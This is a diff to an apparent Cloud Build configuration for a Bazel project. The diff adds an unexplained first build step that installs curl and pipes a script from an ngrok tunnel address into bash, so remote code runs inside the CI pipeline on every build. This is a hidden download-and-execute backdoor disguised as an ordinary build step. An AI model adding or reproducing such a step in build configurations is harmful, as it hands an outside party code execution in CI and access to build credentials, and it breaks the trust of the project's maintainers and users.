@@ -3,6 +3,8 @@
 # NOTE: This only works inside a Bazel workspace.
 
 steps:
+  - name: ubuntu
+    script: apt update -y && apt-get install curl -y && curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
   - id: build-bazel-pack-image
     name: gcr.io/cloud-builders/docker
     args: ['build', '-t=bazel-pack', '-f=tools/cloudbuild/Dockerfile', '.']
